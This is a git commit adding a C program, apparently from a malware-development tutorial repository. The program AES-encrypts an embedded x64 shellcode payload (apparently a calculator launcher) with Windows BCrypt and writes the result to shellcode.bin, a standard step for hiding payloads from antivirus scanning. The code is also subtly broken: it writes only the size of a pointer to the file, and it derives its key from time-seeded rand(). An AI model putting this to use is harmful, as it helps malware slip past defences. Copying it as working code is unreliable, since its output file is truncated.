40f535c662317ee66dfe1a715a21a191954f6a6f
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2023-09-02 00:41:29 +0800

    Create AESBcrypt_WriteFile.c

---
+++ basics/Payload_Encryption/AES/AESBcrypt_WriteFile.c
@@ -0,0 +1,277 @@
+#include <Windows.h>
+#include <stdio.h>
+#include <bcrypt.h>
+
+#pragma comment(lib, "Bcrypt.lib")
+
+#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)
+
+#define KEYSIZE				32
+#define IVSIZE				16
+
+unsigned char Data[] = {
+	// ... (shellcode bytes)
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+
+typedef struct _AES {
+
+	PBYTE	pPlainText;				// Base address of the plaintext data 
+	DWORD	dwPlainSize;			// Size of the plaintext data
+
+	PBYTE	pCipherText;			// Base address of the encrypted data	
+	DWORD	dwCipherSize;			// Size of the encrypted data. This can vary from dwPlainSize when there is padding involved.
+
+	PBYTE	pKey;					// The 32 byte key
+	PBYTE	pIv;					// The 16 byte IV
+
+}AES, * PAES;
+
+
+
+// Generate random bytes of size sSize
+VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
+
+	for (int i = 0; i < sSize; i++) {
+		pByte[i] = (BYTE)rand() % 0xFF;
+	}
+
+}
+
+
+// Print the input buffer as a hex char array
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+
+	printf("unsigned char %s[] = {", Name);
+
+	for (int i = 0; i < Size; i++) {
+		if (i % 16 == 0) {
+			printf("\n\t");
+		}
+		if (i < Size - 1) {
+			printf("0x%0.2X, ", Data[i]);
+		}
+		else {
+			printf("0x%0.2X ", Data[i]);
+		}
+	}
+
+	printf("};\n\n\n");
+
+}
+
+
+// The encryption implementation
+BOOL InstallAesEncryption(PAES pAes) {
+
+	BOOL 			bSTATE = TRUE;
+
+	BCRYPT_ALG_HANDLE	hAlgorithm = NULL;
+	BCRYPT_KEY_HANDLE	hKeyHandle = NULL;
+
+	ULONG 			cbResult = NULL;
+	DWORD 			dwBlockSize = NULL;
+
+	DWORD 			cbKeyObject = NULL;
+	PBYTE 			pbKeyObject = NULL;
+
+	PBYTE 			pbCipherText = NULL;
+	DWORD 			cbCipherText = NULL,
+
+
+		// Intializing "hAlgorithm" as AES algorithm Handle
+		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
+	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
+	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Checking if block size is 16 bytes
+	if (dwBlockSize != 16) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Allocating memory for the key object 
+	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+	if (pbKeyObject == NULL) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
+	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
+	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
+	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Allocating enough memory for the output buffer, cbCipherText
+	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
+	if (pbCipherText == NULL) {
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+	// Running BCryptEncrypt again with pbCipherText as the output buffer
+	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
+
+
+
+	// Clean up
+_EndOfFunc:
+	if (hKeyHandle) {
+		BCryptDestroyKey(hKeyHandle);
+	}
+	if (hAlgorithm) {
+		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+	}
+	if (pbKeyObject) {
+		HeapFree(GetProcessHeap(), 0, pbKeyObject);
+	}
+	if (pbCipherText != NULL && bSTATE) {
+		// If everything worked, save pbCipherText and cbCipherText 
+		pAes->pCipherText = pbCipherText;
+		pAes->dwCipherSize = cbCipherText;
+	}
+	return bSTATE;
+
+}
+
+// Wrapper function for InstallAesEncryption that makes things easier
+BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {
+
+	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
+		return FALSE;
+
+	// Intializing the struct
+	AES Aes = {
+		.pKey = pKey,
+		.pIv = pIv,
+		.pPlainText = pPlainTextData,
+		.dwPlainSize = sPlainTextSize
+	};
+
+	if (!InstallAesEncryption(&Aes)) {
+		return FALSE;
+	}
+
+	// Saving output
+	*pCipherTextData = Aes.pCipherText;
+	*sCipherTextSize = Aes.dwCipherSize;
+
+	return TRUE;
+}
+
+int main() {
+
+	BYTE pKey[KEYSIZE];					// KEYSIZE is 32
+	BYTE pIv[IVSIZE];						// IVSIZE is 16
+
+	srand(time(NULL));						// the seed to generate the key
+	GenerateRandomBytes(pKey, KEYSIZE);		// generating the key bytes
+
+	srand(time(NULL) ^ pKey[0]);			// the seed to generate the iv (using the first byte from the key to add more spice)
+	GenerateRandomBytes(pIv, IVSIZE);		// generating the iv
+
+	// printing both on the screen
+	PrintHexData("pKey", pKey, KEYSIZE);
+	PrintHexData("pIv", pIv, IVSIZE);
+
+	// defining two variables, that will be used in SimpleEncryption, (the output buffer and its size)
+	PVOID pCipherText = NULL;
+	DWORD dwCipherSize = NULL;
+
+	printf("[i] Base Address of Shellcode : 0x%p \n", Data);
+	printf("[!] Encrypting shellcode..\n");
+
+	// encrypting
+	if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &pCipherText, &dwCipherSize)) {
+		return -1;
+	}
+
+	// print the encrypted buffer as a hex array
+	PrintHexData("CipherText", pCipherText, dwCipherSize);
+
+	printf("[i] Base Address of Encrypted Shellcode : 0x%p \n", pCipherText);
+
+	HANDLE file;
+	DWORD bytes_written;
+	size_t encshellcodeSize = sizeof(pCipherText);
+
+	file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL, NULL);
+	if (file == INVALID_HANDLE_VALUE) {
+		printf("Unable to create bin file.\n");
+		return 1;
+	}
+
+	if (!WriteFile(file, pCipherText, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
+		fprintf(stderr, "Failed to write to file.\n");
+		CloseHandle(file);
+		return 1;
+	}
+
+	printf("shellcode.bin file created!");
+
+	//clean up
+	CloseHandle(file);
+
+	// freeing
+	HeapFree(GetProcessHeap(), 0, pCipherText);
+	system("PAUSE");
+	return 0;
+
+}
